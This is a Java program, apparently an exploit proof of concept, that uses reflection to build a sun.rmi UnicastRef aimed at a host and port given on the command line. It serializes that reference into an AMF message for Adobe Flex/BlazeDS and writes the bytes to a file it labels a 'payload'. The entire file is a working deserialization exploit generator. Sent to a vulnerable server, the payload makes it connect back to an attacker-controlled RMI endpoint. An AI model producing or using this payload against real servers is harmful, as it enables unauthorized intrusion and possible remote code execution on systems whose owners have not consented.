




import flex.messaging.io.amf.MessageBody;
import flex.messaging.io.amf.ActionMessage;
import flex.messaging.io.SerializationContext;
import flex.messaging.io.amf.AmfMessageSerializer;
import java.io.*;
import java.lang.reflect.*;

public class ACSFlex {
    public static void main(String[] args) {
        Object unicastRef = generateUnicastRef(args[0], Integer.parseInt(args[1]));
        // serialize object to AMF message
        try {
            byte[] amf = new byte[0];
            amf = serialize(unicastRef);
            DataOutputStream os = new DataOutputStream(new FileOutputStream(args[2]));
            os.write(amf);
            System.out.println("Done, payload written to " + args[2]);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static Object generateUnicastRef(String host, int port) {
        try {
            // Create an RMI ObjID
            java.rmi.server.ObjID objId = new java.rmi.server.ObjID();
            
            // UPDATED PART: Use reflection to create a TCPEndpoint
            Class<?> tcpEndpointClass = Class.forName("sun.rmi.transport.tcp.TCPEndpoint");
            Constructor<?> tcpEndpointConstructor = tcpEndpointClass.getDeclaredConstructor(String.class, int.class);
            Object endpoint = tcpEndpointConstructor.newInstance(host, port);

            // UPDATED PART: Use reflection to create a LiveRef
            Class<?> liveRefClass = Class.forName("sun.rmi.transport.LiveRef");
            Constructor<?> liveRefConstructor = liveRefClass.getDeclaredConstructor(java.rmi.server.ObjID.class, tcpEndpointClass, boolean.class);
            Object liveRef = liveRefConstructor.newInstance(objId, endpoint, false);

            // UPDATED PART: Use reflection to create a UnicastRef
            Class<?> unicastRefClass = Class.forName("sun.rmi.server.UnicastRef");
            Constructor<?> unicastRefConstructor = unicastRefClass.getDeclaredConstructor(liveRefClass);
            return unicastRefConstructor.newInstance(liveRef);

        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    public static byte[] serialize(Object data) throws IOException {
        MessageBody body = new MessageBody();
        body.setData(data);

        ActionMessage message = new ActionMessage();
        message.addBody(body);

        ByteArrayOutputStream out = new ByteArrayOutputStream();
        AmfMessageSerializer serializer = new AmfMessageSerializer();
        serializer.initialize(SerializationContext.getSerializationContext(), out, null);
        serializer.writeMessage(message);

        return out.toByteArray();
    }
}
